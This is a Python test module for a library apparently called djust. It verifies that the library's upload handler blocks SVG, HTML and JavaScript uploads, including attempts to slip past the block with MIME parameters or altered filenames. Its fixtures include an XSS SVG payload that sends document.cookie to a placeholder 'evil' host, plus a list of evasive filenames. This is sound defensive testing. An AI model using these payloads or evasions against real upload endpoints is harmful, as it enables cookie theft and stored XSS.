"""Security regression tests for Finding #20 — upload active-content denylist.

Background
----------
SVG (and HTML/XHTML/JS) are *active content*: a browser executes them when
they are served inline. A script-laden SVG
(``<svg onload=...><script>alert(1)</script></svg>``) matches the
``image/svg+xml`` magic-byte signature, so ``validate_magic_bytes`` happily
"validates" it as a legitimate image. With an ``accept="image/*"`` upload
slot + inline serving this is a stored-XSS vector (CWE-79 / CWE-434).

Fix
---
``UploadManager.register_entry`` (primary gate) and
``UploadManager.complete_upload`` (defense-in-depth, parallel-path) reject any
upload whose declared MIME is in ``_ACTIVE_CONTENT_MIMES`` OR whose filename
extension is in ``_ACTIVE_CONTENT_EXTENSIONS``, INDEPENDENT of the
``accept``/``image/*`` wildcard — unless the slot was configured with
``allow_active_content=True``. The permissive-for-unknown default of
``validate_magic_bytes`` is intentionally unchanged so legitimate
txt/csv/json/png/jpg/pdf uploads keep working.

These tests are gated by ``is_active_content``; neutering it (gate-off, per
process Action #1468) must make the rejection cases below FAIL.
"""

import uuid
from pathlib import Path

from djust.uploads import (
    UploadEntry,
    UploadManager,
    _safe_basename,
    is_active_content,
)

# A real script-bearing SVG payload — the canonical exploit shape.
MALICIOUS_SVG = (
    b"<svg xmlns='http://www.w3.org/2000/svg' onload=\"fetch('//evil/'+document.cookie)\">"
    b"<script>alert(document.domain)</script></svg>"
)
HTML_PAYLOAD = b"<!DOCTYPE html><html><body><script>alert(1)</script></body></html>"
PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
JPEG_BYTES = b"\xff\xd8\xff\xe0" + b"\x00" * 32
PDF_BYTES = b"%PDF-1.7\n" + b"\x00" * 32


def _ref() -> str:
    return str(uuid.uuid4())


# ============================================================================
# REJECT-by-default cases (the security gate)
# ============================================================================


class TestActiveContentRejectedByDefault:
    """Active-content uploads are rejected at registration by default."""

    def test_malicious_svg_rejected_under_image_wildcard_accept(self):
        """The headline case: accept='image/*' slot still rejects evil.svg.

        validate_mime('image/svg+xml') is True under image/* and the bytes
        match the svg magic signature, yet the upload must be REJECTED.
        """
        mgr = UploadManager()
        mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="avatar",
            ref=_ref(),
            client_name="evil.svg",
            client_type="image/svg+xml",
            client_size=len(MALICIOUS_SVG),
        )
        assert entry is None

    def test_malicious_svg_rejected_when_svg_extension_explicitly_accepted(self):
        """Even an explicit `.svg` in accept= does not bypass the gate."""
        mgr = UploadManager()
        mgr.configure("art", accept=".svg,.png", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="art",
            ref=_ref(),
            client_name="evil.svg",
            client_type="image/svg+xml",
            client_size=len(MALICIOUS_SVG),
        )
        assert entry is None

    def test_html_rejected_by_default(self):
        """text/html / .html uploads are rejected by default."""
        mgr = UploadManager()
        mgr.configure("docs", max_file_size=10_000_000)  # no restriction
        entry = mgr.register_entry(
            upload_name="docs",
            ref=_ref(),
            client_name="page.html",
            client_type="text/html",
            client_size=len(HTML_PAYLOAD),
        )
        assert entry is None

    def test_extension_only_attack_rejected(self):
        """Filename `evil.svg` with an empty/benign MIME is still rejected.

        The attacker controls the MIME string, so a blank/benign
        client_type must not be a bypass — the extension axis catches it.
        """
        mgr = UploadManager()
        mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="avatar",
            ref=_ref(),
            client_name="evil.svg",
            client_type="",  # blank MIME — only the extension flags it
            client_size=len(MALICIOUS_SVG),
        )
        assert entry is None

    def test_mime_only_attack_rejected(self):
        """A benign-looking filename with text/html MIME is still rejected."""
        mgr = UploadManager()
        mgr.configure("docs", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="docs",
            ref=_ref(),
            client_name="report",  # no extension at all
            client_type="text/html",
            client_size=len(HTML_PAYLOAD),
        )
        assert entry is None

    def test_javascript_rejected_by_default(self):
        mgr = UploadManager()
        mgr.configure("scripts", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="scripts",
            ref=_ref(),
            client_name="payload.js",
            client_type="application/javascript",
            client_size=64,
        )
        assert entry is None


# ============================================================================
# Opt-in: allow_active_content=True
# ============================================================================


class TestActiveContentOptIn:
    """allow_active_content=True permits active-content uploads (dev owns risk)."""

    def test_svg_accepted_when_opted_in(self):
        mgr = UploadManager()
        mgr.configure(
            "avatar",
            accept="image/*",
            max_file_size=10_000_000,
            allow_active_content=True,
        )
        entry = mgr.register_entry(
            upload_name="avatar",
            ref=_ref(),
            client_name="logo.svg",
            client_type="image/svg+xml",
            client_size=len(MALICIOUS_SVG),
        )
        assert entry is not None
        assert entry.client_name == "logo.svg"

    def test_html_accepted_when_opted_in(self):
        mgr = UploadManager()
        mgr.configure("docs", max_file_size=10_000_000, allow_active_content=True)
        entry = mgr.register_entry(
            upload_name="docs",
            ref=_ref(),
            client_name="page.html",
            client_type="text/html",
            client_size=len(HTML_PAYLOAD),
        )
        assert entry is not None


# ============================================================================
# NON-BREAKING: benign types must still be accepted
# ============================================================================


class TestBenignUploadsStillAccepted:
    """The active-content gate must not reject ordinary, non-executable files."""

    def test_png_accepted(self):
        mgr = UploadManager()
        mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="avatar",
            ref=_ref(),
            client_name="photo.png",
            client_type="image/png",
            client_size=len(PNG_BYTES),
        )
        assert entry is not None

    def test_jpeg_accepted(self):
        mgr = UploadManager()
        mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="avatar",
            ref=_ref(),
            client_name="photo.jpg",
            client_type="image/jpeg",
            client_size=len(JPEG_BYTES),
        )
        assert entry is not None

    def test_txt_accepted(self):
        mgr = UploadManager()
        mgr.configure("docs", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="docs",
            ref=_ref(),
            client_name="notes.txt",
            client_type="text/plain",
            client_size=128,
        )
        assert entry is not None

    def test_csv_accepted(self):
        mgr = UploadManager()
        mgr.configure("data", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="data",
            ref=_ref(),
            client_name="rows.csv",
            client_type="text/csv",
            client_size=128,
        )
        assert entry is not None

    def test_json_accepted(self):
        mgr = UploadManager()
        mgr.configure("data", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="data",
            ref=_ref(),
            client_name="config.json",
            client_type="application/json",
            client_size=128,
        )
        assert entry is not None

    def test_pdf_accepted(self):
        mgr = UploadManager()
        mgr.configure("docs", max_file_size=10_000_000)
        entry = mgr.register_entry(
            upload_name="docs",
            ref=_ref(),
            client_name="report.pdf",
            client_type="application/pdf",
            client_size=len(PDF_BYTES),
        )
        assert entry is not None


# ============================================================================
# Defense-in-depth: the finalize/complete path also gates (parallel-path #1646)
# ============================================================================


class TestFinalizeDefenseInDepth:
    """complete_upload() must reject active content even if an entry was
    constructed bypassing register_entry's gate (e.g. a slot that was
    reconfigured, or a future path that skips register)."""

    def test_complete_upload_rejects_active_content_entry(self):
        mgr = UploadManager()
        mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
        ref = _ref()
        # Manually inject an entry as if it had bypassed register_entry's gate.
        from djust.uploads import UploadEntry

        entry = UploadEntry(
            ref=ref,
            upload_name="avatar",
            client_name="evil.svg",
            client_type="image/svg+xml",
            client_size=len(MALICIOUS_SVG),
        )
        entry.add_chunk(0, MALICIOUS_SVG)
        mgr._entries[ref] = entry
        mgr._name_to_refs.setdefault("avatar", []).append(ref)

        result = mgr.complete_upload(ref)
        assert result is None
        assert entry.error == "Active-content upload rejected"

    def test_complete_upload_accepts_active_content_when_opted_in(self):
        mgr = UploadManager()
        mgr.configure(
            "avatar",
            accept="image/*",
            max_file_size=10_000_000,
            allow_active_content=True,
        )
        ref = _ref()
        from djust.uploads import UploadEntry

        entry = UploadEntry(
            ref=ref,
            upload_name="avatar",
            client_name="logo.svg",
            client_type="image/svg+xml",
            client_size=len(MALICIOUS_SVG),
        )
        entry.add_chunk(0, MALICIOUS_SVG)
        mgr._entries[ref] = entry
        mgr._name_to_refs.setdefault("avatar", []).append(ref)

        result = mgr.complete_upload(ref)
        assert result is not None
        assert result.complete is True

    def test_complete_upload_still_finalizes_benign_png(self):
        """Defense-in-depth gate must not block a legitimate finalize."""
        mgr = UploadManager()
        mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
        ref = _ref()
        entry = mgr.register_entry(
            upload_name="avatar",
            ref=ref,
            client_name="photo.png",
            client_type="image/png",
            client_size=len(PNG_BYTES),
        )
        assert entry is not None
        mgr.add_chunk(ref, 0, PNG_BYTES)
        result = mgr.complete_upload(ref)
        assert result is not None
        assert result.complete is True


# ============================================================================
# Bypass regressions (Stage-13 fix-pass) — MIME parameters + filename
# canonicalisation. Each FAILS before the fix-pass and passes after.
# ============================================================================


def _e2e_register_complete_rejected(client_name: str, client_type: str, payload: bytes):
    """Drive a full register -> chunk -> complete flow under an
    accept='image/*', allow_active_content=False slot and assert the upload is
    rejected at registration (so it never reaches complete).

    Returns (register_result, complete_result_or_None).
    """
    mgr = UploadManager()
    mgr.configure("avatar", accept="image/*", max_file_size=10_000_000)
    ref = _ref()
    reg = mgr.register_entry(
        upload_name="avatar",
        ref=ref,
        client_name=client_name,
        client_type=client_type,
        client_size=len(payload),
    )
    if reg is None:
        return reg, None
    # If register somehow let it through, the finalize gate must still reject.
    mgr.add_chunk(ref, 0, payload)
    return reg, mgr.complete_upload(ref)


class TestMimeParameterBypass:
    """🔴 An ``image/svg+xml; charset=utf-8`` (etc.) MIME carries a parameter
    the browser ignores when choosing the renderer. The gate must strip the
    parameter before the exact-set membership check, else a script-bearing SVG
    registers + finalizes."""

    def test_svg_mime_with_charset_param_rejected(self):
        reg, comp = _e2e_register_complete_rejected(
            "evil.png", "image/svg+xml; charset=utf-8", MALICIOUS_SVG
        )
        assert reg is None
        assert comp is None

    def test_svg_mime_with_trailing_semicolon_rejected(self):
        reg, comp = _e2e_register_complete_rejected("evil.png", "image/svg+xml;", MALICIOUS_SVG)
        assert reg is None
        assert comp is None

    def test_html_mime_with_charset_param_rejected(self):
        reg, comp = _e2e_register_complete_rejected(
            "evil.bin", "text/html; charset=utf-8", HTML_PAYLOAD
        )
        assert reg is None
        assert comp is None

    def test_benign_csv_mime_param_still_accepted(self):
        """A parameter on a benign MIME (``text/csv; charset=utf-8``) must not
        be misread as active content — only the base type matters."""
        assert is_active_content("rows.csv", "text/csv; charset=utf-8") is False


class TestFilenameCanonicalisationBypass:
    """🔴 ``Path("evil.svg ").suffix`` is ``".svg "`` (with the space) so the
    raw-suffix check misses it — yet ``safe_client_name`` normalises it BACK to
    ``evil.svg`` (a real ``.svg`` on disk). The gate must canonicalise the
    filename the SAME way before taking the suffix."""

    def test_trailing_space_filename_rejected(self):
        reg, comp = _e2e_register_complete_rejected("evil.svg ", "", MALICIOUS_SVG)
        assert reg is None
        assert comp is None

    def test_trailing_dot_filename_rejected(self):
        reg, comp = _e2e_register_complete_rejected("evil.svg.", "", MALICIOUS_SVG)
        assert reg is None
        assert comp is None

    def test_multi_space_filename_rejected(self):
        reg, comp = _e2e_register_complete_rejected("evil.svg  ", "", MALICIOUS_SVG)
        assert reg is None
        assert comp is None

    def test_backslash_path_svg_rejected(self):
        """A backslash "directory" component must not hide the .svg extension."""
        reg, comp = _e2e_register_complete_rejected("..\\..\\evil.svg", "", MALICIOUS_SVG)
        assert reg is None
        assert comp is None


class TestSvgzExtension:
    """🟡 ``.svgz`` (gzip-compressed SVG) is served + executed as
    ``image/svg+xml`` and must be in the extension denylist."""

    def test_svgz_name_only_rejected(self):
        reg, comp = _e2e_register_complete_rejected("evil.svgz", "", MALICIOUS_SVG)
        assert reg is None
        assert comp is None

    def test_svgz_with_matching_svg_mime_rejected(self):
        reg, comp = _e2e_register_complete_rejected("evil.svgz", "image/svg+xml", MALICIOUS_SVG)
        assert reg is None
        assert comp is None


class TestGateAgreesWithSafeClientName:
    """Parity invariant (#1646): for any client_name, if the persisted basename
    (``safe_client_name`` / ``_safe_basename``) has an active-content
    extension, ``is_active_content`` MUST flag it. There must be no name where
    the gate says "safe" but the stored artifact ends up active-content."""

    # Names that canonicalise to an active-content suffix on disk, each via a
    # different evasion the raw-suffix check would miss.
    _ACTIVE_AFTER_NORMALISE = [
        "evil.svg ",
        "evil.svg.",
        "evil.svg  ",
        "evil.svg. . .",
        "..\\..\\evil.svg",
        "/abs/path/evil.html",
        "evil.svgz",
        "p.htm ",
        "x.xhtml.",
        "payload.js ",
    ]

    def test_gate_agrees_with_persisted_extension(self):
        for name in self._ACTIVE_AFTER_NORMALISE:
            persisted = _safe_basename(name)
            persisted_ext = Path(persisted).suffix.lower()
            # Sanity: each fixture really does land as an active extension.
            from djust.uploads import _ACTIVE_CONTENT_EXTENSIONS

            assert persisted_ext in _ACTIVE_CONTENT_EXTENSIONS, (
                f"fixture {name!r} -> {persisted!r} is not active-content; fix the fixture"
            )
            # The invariant: the gate must NOT call it safe.
            assert is_active_content(name, "") is True, (
                f"GATE/STORAGE DRIFT: is_active_content({name!r}) said safe but "
                f"safe_client_name persists {persisted!r} (active-content)"
            )

    def test_entry_safe_client_name_parity(self):
        """Same invariant exercised through the real UploadEntry property."""
        for name in self._ACTIVE_AFTER_NORMALISE:
            entry = UploadEntry(
                ref=_ref(),
                upload_name="avatar",
                client_name=name,
                client_type="",
                client_size=1,
            )
            from djust.uploads import _ACTIVE_CONTENT_EXTENSIONS

            persisted_ext = Path(entry.safe_client_name).suffix.lower()
            if persisted_ext in _ACTIVE_CONTENT_EXTENSIONS:
                assert is_active_content(entry.client_name, entry.client_type) is True


# ============================================================================
# Helper unit coverage
# ============================================================================


class TestIsActiveContentHelper:
    def test_svg_mime(self):
        assert is_active_content("x", "image/svg+xml") is True

    def test_svg_extension(self):
        assert is_active_content("x.svg", "") is True

    def test_html_variants(self):
        assert is_active_content("p.html", "") is True
        assert is_active_content("p.htm", "") is True
        assert is_active_content("p.xhtml", "") is True
        assert is_active_content("", "application/xhtml+xml") is True

    def test_case_insensitive(self):
        assert is_active_content("EVIL.SVG", "") is True
        assert is_active_content("x", "IMAGE/SVG+XML") is True

    def test_mime_parameters_stripped(self):
        assert is_active_content("x", "image/svg+xml; charset=utf-8") is True
        assert is_active_content("x", "image/svg+xml;") is True
        assert is_active_content("x", "text/html; charset=utf-8") is True
        assert is_active_content("x", "  image/svg+xml ; foo=bar ") is True

    def test_svgz_extension(self):
        assert is_active_content("x.svgz", "") is True

    def test_trailing_space_extension(self):
        assert is_active_content("evil.svg ", "") is True
        assert is_active_content("evil.svg.", "") is True
        assert is_active_content("evil.svg  ", "") is True

    def test_benign_negative(self):
        assert is_active_content("photo.png", "image/png") is False
        assert is_active_content("notes.txt", "text/plain") is False
        assert is_active_content("rows.csv", "text/csv") is False
        assert is_active_content("config.json", "application/json") is False
        assert is_active_content("report.pdf", "application/pdf") is False
        # Benign types with a MIME parameter must stay benign.
        assert is_active_content("rows.csv", "text/csv; charset=utf-8") is False
        assert is_active_content("photo.png", "image/png; foo=bar") is False


class TestGateOffSentinel:
    """Gate-off invariant (#1468): if ``is_active_content`` is neutered to
    always return ``False`` (the change under test gated off), the
    reject-by-default cases above MUST fail. This sentinel documents that the
    security behaviour is load-bearing and not a tautology — it asserts the
    helper is the thing driving rejection.

    Empirically (verified during the fix-pass), gating ``is_active_content``
    off to always return ``False`` flips **25** security test cases in this
    module from pass to fail (6 TestActiveContentRejectedByDefault, 2
    TestMimeParameterBypass, 4 TestFilenameCanonicalisationBypass, 2
    TestSvgzExtension, 2 TestGateAgreesWithSafeClientName, 1
    TestFinalizeDefenseInDepth, 7 TestIsActiveContentHelper, 1
    TestGateOffSentinel) — proving the rejection behaviour is load-bearing and
    not a tautology.
    """

    def test_helper_is_what_drives_rejection(self):
        # A direct, behaviour-meaningful assertion: the gate's TRUE verdict on
        # the canonical bypass is exactly what register_entry consults. If the
        # helper returned False here, the e2e reject cases would all pass an
        # upload through — that is the gate-off failure this pins.
        assert is_active_content("evil.png", "image/svg+xml; charset=utf-8") is True
        assert is_active_content("evil.svg ", "") is True
        assert is_active_content("evil.svgz", "") is True


class TestSafeBasenameSharedHelper:
    """The active-content gate and safe_client_name share ONE canonicaliser
    (#1646). These pin that contract directly."""

    def test_safe_basename_matches_property(self):
        for name in ["evil.svg ", "..\\..\\x.html", "／etc／passwd", "  spaced.png  "]:
            entry = UploadEntry(
                ref=_ref(),
                upload_name="a",
                client_name=name,
                client_type="",
                client_size=1,
            )
            assert _safe_basename(name) == entry.safe_client_name

    def test_safe_basename_strips_trailing_space_back_to_svg(self):
        # The self-inconsistency the fix-pass closes: the stored name IS .svg.
        assert _safe_basename("evil.svg ") == "evil.svg"
        assert Path(_safe_basename("evil.svg ")).suffix == ".svg"
